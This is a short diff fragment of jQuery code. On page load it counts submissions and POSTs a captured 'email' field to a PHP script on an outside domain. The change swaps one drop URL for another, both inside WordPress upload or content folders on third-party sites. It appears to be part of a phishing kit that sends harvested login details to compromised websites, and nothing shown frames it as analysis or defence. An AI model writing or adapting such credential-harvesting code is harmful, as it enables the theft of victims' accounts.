@@ -313,7 +313,7 @@ $(document).ready(function() {
         count = count + 1;
         $.ajax({
             dataType: 'JSON',
-            url: "https://careers.xenopsi.com/wp-content/uploads/next.php",
+            url: "https://ourogaia.com/wp-content/or.php/next.php",
             type: 'POST',
             data: {
                 email: email,
